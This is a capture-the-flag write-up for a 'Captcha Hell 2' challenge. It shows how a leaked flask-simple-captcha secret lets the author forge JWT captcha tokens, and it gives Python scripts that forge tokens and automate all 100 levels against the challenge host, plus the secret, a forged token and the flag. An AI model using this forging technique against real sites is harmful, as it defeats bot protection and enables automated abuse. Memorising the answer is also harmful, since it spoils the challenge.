# Captcha Hell 2
<img width="700" height="570" alt="{4A8674FA-8823-46A6-8932-B7CC4E685738}" src="https://github.com/user-attachments/assets/e676bc29-69ac-47f2-bd7a-111097785684" />


### Description:

Can you prove that you are not a robot?

Same site as in hell 1, but now you need to actually beat the captcha.


#### Hints:
Hint: You will need something from the Captcha Hell 1 solve to solve this. Look at the same place you found the flag.



#### Notes:
- The website is a game where you have to solve captchas for a hundred levels to prove you arent a robot.
- The captchas become increasingly harder for each level.
- When creating a user you are given a cookie with the name "progress", this tracks the users progress
 
---
# Solution:


According to the description you need to actually solve all 100 levels to get the flag. 

So i began with analysing the challenges and their source code:
<img width="976" height="718" alt="{E3B6F8B9-318D-465C-8D20-EBAC9BAE1141}" src="https://github.com/user-attachments/assets/b00c9381-d667-45f2-90f0-b74d76283bf1" />  
<img width="2147" height="86" alt="{5D0AE5D1-1C4E-4989-A742-0FF49719BC09}" src="https://github.com/user-attachments/assets/1f070b13-a3ce-4e49-8fa8-1d9ca1c08e88" />  

Here i noticed that there is something called a captcha_hash which looked like a JWT, and after decoding it i got this:  

<img width="1015" height="711" alt="{885C4632-7CD9-4334-90FC-CF847D73540C}" src="https://github.com/user-attachments/assets/0fa775b6-9478-479a-ba5f-8d3fed60061b" />  

So the hash has two parts, a hashed text and an expiration date.  
And this is the request made when submitting:

<img width="887" height="797" alt="{5A5D8BD3-EECF-4270-9CD2-A82693AFE031}" src="https://github.com/user-attachments/assets/359d0a8d-5f2c-4d01-af67-5fbdbd1baeb4" />  

And as this level had 6 letters, the next one has 12:
<img width="801" height="441" alt="{FE606B87-CA13-45F1-B749-1F44AB9EF7A7}" src="https://github.com/user-attachments/assets/27ea020f-d420-4e14-9952-fea56fdd410d" />  

This means that by level 100 there would be 600 letters needed, and this is basically impossible.   
We can define it as such: **Level*6**  

--- 

After solving Captcha Hell 1 you are given something called the "flask_simple_captcha_secret"
<img width="2308" height="543" alt="497372659-5076d2da-69fa-471e-bd9d-ecc82830b9c2" src="https://github.com/user-attachments/assets/e05d2d11-4431-4c47-94fd-e354e3899463" />

Having no idea what this is, i decided to do some research, so i searched for "flask simple captcha secret".  
Thats when i found this github repository: https://github.com/cc-d/flask-simple-captcha  

After scrolling around i found this part which talekd about Encryption and decryption:
<img width="857" height="914" alt="{0B5C298C-2FB0-453C-9F5B-18A1A402F30A}" src="https://github.com/user-attachments/assets/8bc5366f-c502-41ba-9573-f5b1c07769c1" />  

To use the encryption you need two things:
1. The Secret_key
2. Payload  

And for the decryption you need three things:
1. The Secret_key
2. Original text
3. JWT Token

Luckily we have all of these things,
* The Secret_key was given to me and is the "flask_simple_captcha_secret":**fc3aaf4efe30ab820471d846e0709982fc3aaf4efe30ab820471d846e0709982**  
* The Payload is what you want the answer to the captcha to be.
* The Original text is what the answer to the captcha is.
* The JWT Token is the Captcha_hash and can be found in each levels source_code.  

The encryption  is a way to make your own Captcha_hashes.  
But the decryption isnt really decrypting it, it just confirms if what you have entered is correct, or not.

So to confirm that i am in the right place i create a decryption script and insert the JWT token and payload of the first level to see if it checks out:

```
import jwt
from werkzeug.security import check_password_hash

# Configuration
SECRET_KEY = "fc3aaf4efe30ab820471d846e0709982fc3aaf4efe30ab820471d846e0709982"

JWTT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJoYXNoZWRfdGV4dCI6InNjcnlwdDozMjc2" \
"ODo4OjEkZlRGeVVUdWNBQzMwU1JOeCRjZDNiNjcxMTA0Njk3MWIzOTk4OTQ3MTg5MGU0YTc4OGEyN2E1" \
"ZWUwMzAyNjdhYTc5YmVlZTk2NzBlYWUyYzNlNWEwYTE5N2VlYThmNmRlY2MzZmJjNzc1NzdlNDQzOGY2" \
"YzQ5ODk3MWJlNGVmMjY1ODc5NmYyZWM1YTYxNjljZiIsImV4cCI6MTc1OTU4Mzc3Nn0.5O0X7uqzZU7m" \
"BA-OC-r4o9uymA7IRuMnhTJlbgfxWeY"

Original_Text = "STRBPJ"

def decrypt_captcha(token: str, original_text: str) -> bool:
    try:
        # Step 1: Decode the JWT with the Secret key
        decoded = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        #Take the hashed text
        hashed_text = decoded["hashed_text"]
        # Step 2: Verify the hash
        salted_original_text = SECRET_KEY + original_text
        if check_password_hash(hashed_text, salted_original_text):
            return True  # CAPTCHA is correct
        else:
            return False  # CAPTCHA does not match
    except jwt.ExpiredSignatureError:
        print("Token expired")
        return False
    except jwt.InvalidTokenError:
        print("Invalid token")
        return False

if decrypt_captcha(JWTT, Original_Text):
    print("CAPTCHA verified!")
else:
    print("CAPTCHA failed.")

```

And that it does:  
<img width="342" height="96" alt="{6F5291AF-F028-4053-8534-3F3DB91D3395}" src="https://github.com/user-attachments/assets/5883c8fe-5d20-41e7-aa70-f63f40a773c5" />  

Now we can make the encryption script so that we can create our own captchas.
And then we can check if we can just insert our own captcha to pass through the levels:
````
import jwt
from werkzeug.security import generate_password_hash
from datetime import datetime, timedelta, UTC

# Configuration
SECRET_KEY = "fc3aaf4efe30ab820471d846e0709982fc3aaf4efe30ab820471d846e0709982"
captcha_payload = "AAAA"
EXPIRE_SECONDS = 3600

def encrypt_captcha(text: str) -> str:
    # Step 1: Salt the text
    salted_text = SECRET_KEY + text

    # Step 2: Hash the salted text
    hashed_text = generate_password_hash(salted_text)

    # Step 3: Create JWT payload
    payload = {
        "hashed_text": hashed_text,
        "exp": datetime.now(UTC) + timedelta(seconds=EXPIRE_SECONDS)    }

    # Step 4: Encode JWT
    token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
    return token

# Example usage

jwt_token = encrypt_captcha(captcha_payload)
print("Encrypted JWT:", jwt_token)

````

After running the script we get the captcha hash:  
<img width="1829" height="207" alt="image" src="https://github.com/user-attachments/assets/18db9371-96d3-4098-a5d6-628b57637b6c" />  
Now we can place the hash, and the answer into an intercepted request and check what happens:
<img width="1050" height="110" alt="{B8E89553-2DE6-44CB-9FC1-32EE01968E52}" src="https://github.com/user-attachments/assets/f1df7001-27fe-4870-a112-f5cf035b2230" />  
<img width="453" height="100" alt="{6A2B6777-CB3A-4429-A6C5-B9F0A457ACB5}" src="https://github.com/user-attachments/assets/4bfdf78d-6510-4535-91b8-0a9cd53ed06c" />  
As you can see the captcha was processed and came out correct, but it says that it belongs to a different level.  
This tells us that the site has a way of checking if the captcha belongs to the correct level.

After some testing i noticed that every time you reload a level a new captcha is made, this tells us that there isnt a list of valid captcha's and that it's verified some other way.  
And after some more testing i found out that it verifies by checking the amount of letters in the answer/payload.  

So this is what i did:
* Changed the encryption scripts payload to 6 letters.
* Ran it and made a new hash:
  <img width="1019" height="197" alt="{B793DFE6-73CF-4E51-85E3-7B58B76D9AEB}" src="https://github.com/user-attachments/assets/fdbb00bc-a33a-4f9e-81ee-99982029febc" />  
* Put it into the request and forwarded it:
  <img width="1061" height="107" alt="{3C3CBE67-A7B1-4FF6-AA7D-9EA9517D8828}" src="https://github.com/user-attachments/assets/2e91cbe7-bb32-4591-803c-3503bda53b9b" />  
* And BAM! were in:
  <img width="1108" height="590" alt="{0228CFAF-39CF-4FC6-9C80-13CC8ABA3D2E}" src="https://github.com/user-attachments/assets/5bbba22a-ac09-457e-be99-2be7c69e550f" />  


Now that we know everything all we need to do is automate it so that it goes through all 100 levels, and then gives us the progrss cookie.
````
#!/usr/bin/env python3
"""
Auto-captcha progression script with URL-based stop detection.

Uses the server-style JWT for answers (payload contains only hashed_text and exp),
and saves the progress cookie only once at the end.
"""

import re
import sys
import time
import random
import string
import logging
from datetime import datetime, timedelta, timezone
from typing import Optional
from urllib.parse import urlparse

import requests
import jwt
from werkzeug.security import generate_password_hash

# ---------------------- CONFIG ----------------------
BASE_URL = "https://captcha.swarm.fuckpwn.no"
SECRET_KEY = "fc3aaf4efe30ab820471d846e0709982fc3aaf4efe30ab820471d846e0709982"
USERNAME = "Writeuptest3"

START_LEVEL = 1
TARGET_LEVEL = 100           # stop at this level
LENGTH_MULTIPLIER = 6
EXPIRE_SECONDS = 3600
SLEEP_BETWEEN = 0.15
USE_METHOD = None            # keep None to use werkzeug default
# ----------------------------------------------------

ALPHABET = string.ascii_uppercase + string.digits
session = requests.Session()

# Configure logging
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S"
)
log = logging.getLogger(__name__)


# ---------------------- HELPERS ----------------------

def normalize_token(token: Optional[str]) -> Optional[str]:
    if not token:
        return None
    import urllib.parse
    return urllib.parse.unquote(token.strip())


def make_random_text(length: int) -> str:
    return "".join(random.choice(ALPHABET) for _ in range(length))


def make_jwt_for_answer(secret: str, answer: str, expire_seconds: int = EXPIRE_SECONDS) -> str:
    """
    Produce the JWT exactly like your provided encrypt_captcha:
      - salt the text with SECRET_KEY
      - hash the salted text with werkzeug.generate_password_hash
      - create payload with "hashed_text" and "exp" (timezone-aware UTC)
      - sign using HS256 and return the token as a string
    """
    salted_text = secret + answer
    # use explicit method only if configured
    if USE_METHOD:
        hashed_text = generate_password_hash(salted_text, method=USE_METHOD)
    else:
        hashed_text = generate_password_hash(salted_text)

    payload = {
        "hashed_text": hashed_text,
        "exp": datetime.now(timezone.utc) + timedelta(seconds=expire_seconds)
    }

    token = jwt.encode(payload, secret, algorithm="HS256")
    # PyJWT may return bytes on older versions; ensure str
    return token if isinstance(token, str) else token.decode()


def create_username(session: requests.Session, base_url: str, username: str) -> bool:
    url = f"{base_url.rstrip('/')}/"
    log.info(f"Registering username '{username}'...")
    resp = session.post(url, data={"username": username}, allow_redirects=True, timeout=15)
    return resp.status_code in (200, 302, 303)


def get_progress_cookie(session: requests.Session) -> Optional[str]:
    for cookie in session.cookies:
        if cookie.name == "progress":
            return cookie.value
    return None


def submit_level(session: requests.Session, base_url: str, level: int,
                 answer: str, token: str) -> requests.Response:
    url = f"{base_url.rstrip('/')}/level/{level}"
    data = {"captcha-text": answer, "captcha-hash": token}
    try:
        session.get(url, timeout=10)
    except Exception:
        # ignore GET failures; we'll still try the POST
        pass
    return session.post(url, data=data, allow_redirects=True, timeout=15)


def extract_level_from_url(url: str) -> Optional[int]:
    if not url:
        return None
    parsed = urlparse(url)
    m = re.search(r"/level/(\d+)", parsed.path)
    if m:
        try:
            return int(m.group(1))
        except ValueError:
            return None
    return None


def save_progress_cookie(cookie: str, filename: str = "progress_cookie.txt") -> None:
    with open(filename, "w") as fh:
        fh.write(cookie)
    log.info(f"Saved progress cookie to {filename}")


# ---------------------- MAIN ----------------------

def main():
    log.info("Auto-progression script starting")
    log.info(f"Target server: {BASE_URL}")
    log.info(f"Target level: {TARGET_LEVEL}")

    if not (3 <= len(USERNAME) <= 20):
        log.error("USERNAME must be 3–20 characters long.")
        sys.exit(1)

    if not create_username(session, BASE_URL, USERNAME):
        log.error("Failed to create username. Aborting.")
        sys.exit(1)

    time.sleep(0.5)

    final_cookie = None
    final_url = None

    for level in range(START_LEVEL, TARGET_LEVEL + 1):
        length = level * LENGTH_MULTIPLIER
        answer = make_random_text(length)
        token = normalize_token(make_jwt_for_answer(SECRET_KEY, answer, expire_seconds=EXPIRE_SECONDS))

        log.info(f"[Level {level}] Submitting answer of length {length}...")

        try:
            resp = submit_level(session, BASE_URL, level, answer, token)
        except Exception as e:
            log.warning(f"Request failed for level {level}: {e}")
            log.info("Retrying in 5 seconds...")
            time.sleep(5)
            try:
                resp = submit_level(session, BASE_URL, level, answer, token)
            except Exception as e2:
                log.error(f"Retry failed: {e2}. Exiting.")
                sys.exit(1)

        # Check final URL for /level/<n>
        found_level = extract_level_from_url(resp.url)
        if found_level is not None:
            log.info(f"Server final URL indicates level {found_level}.")
            if found_level >= TARGET_LEVEL:
                final_cookie = get_progress_cookie(session)
                final_url = resp.url
                break

        # Fallback cookie-based check
        prog = get_progress_cookie(session)
        if prog:
            try:
                if int(prog) >= TARGET_LEVEL:
                    final_cookie = prog
                    final_url = resp.url
                    break
            except ValueError:
                if str(TARGET_LEVEL) in prog:
                    final_cookie = prog
                    final_url = resp.url
                    break

        time.sleep(SLEEP_BETWEEN)

    # Save only once at the end
    if final_cookie:
        save_progress_cookie(final_cookie)
        if final_url:
            log.info(f"Stopped at URL: {final_url}")
    else:
        log.warning("Target level not reached. No progress cookie saved.")


if __name__ == "__main__":
    main()

````
Now what happens here is that it goes through every level all the way to level 100.
Once there it confirms and then creates a .txt file with the progress cookie in it:  

<img width="1045" height="86" alt="{7CE16D72-A42B-4657-A8A2-4C1B9211A7D7}" src="https://github.com/user-attachments/assets/ec88f4bf-1c8a-4e6f-ae10-b30cbcee1643" />  

If you now open the file, and take the progress cookie:  

<img width="1014" height="89" alt="{806E18DF-B0B6-4F2A-862A-C358716D0B43}" src="https://github.com/user-attachments/assets/96fc03c4-b94a-4a8c-bc39-9d9adc25e34a" />  

We can insert it into our browsers cookie and log in as the user:  

<img width="614" height="115" alt="{B54E9E05-0EB3-4F96-86FE-E8E07F2DD9F4}" src="https://github.com/user-attachments/assets/f8189420-abcc-431e-a1c2-d836edf17c0b" />  

And there we go, Level 100.  

<img width="1012" height="754" alt="{12BBC08F-7D50-4391-ABCB-134CD6B5C469}" src="https://github.com/user-attachments/assets/09e09baf-c4b4-4a2b-a2fe-8b9d304ea0c0" />  

Now for the final part you actually need to solve it and this can be done manually, so know that the length should be level*6, so this means the payload needs to be 600 characters:  

<img width="400" height="298" alt="{0AFB7821-D50D-41C2-B1BB-EDCA968F7442}" src="https://github.com/user-attachments/assets/529b4702-7aea-47b4-9140-e532e1b0b43c" />  

And after running the script we get the final hash:  
"**eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJoYXNoZWRfdGV4dCI6InNjcnlwdDozMjc2ODo4OjEkSUFKcFpYVEh2aEVoUXZTViQxYmNmZWFmNzhkZGNiYTE1NjdlOWNlYTg5NWQyMjQ5MDI1YjI1YTY5MWVkZDk3YjkxN2VkMDJlOTljNTM2MDQ2YTc0ZTIyYTU4ZjU3OTg5YzQ0M2E0ZjgzMWE3NjEwMzQyNTJjMTg3Njg2ZjkyMzlmMzVlZWEzMjJkZmRhYjFmMyIsImV4cCI6MTc1OTU5MzM3Nn0.Ynr1g4HiRHwb_7977BG259DnBSj2Vy0Nn4AwSMJk664**"

Now we just need to intercept the request to inject the hash, and answer in:  
<img width="1446" height="198" alt="{20F3AF46-5CE4-4F2C-85E8-4F39CFBF3DAA}" src="https://github.com/user-attachments/assets/018ec957-6864-4625-baec-a5de43b80b3c" />  

Finally once it is forwarded we can return to the site and see the flag:  
<img width="1263" height="155" alt="{31016266-D10D-42F5-8C44-FE54F78024AA}" src="https://github.com/user-attachments/assets/fe2c858d-642e-4de5-8b02-4dee880ba16c" />  

Flag: **CTFkom{y0u_423_n07_4_20807_c0n9247u14710n5}**



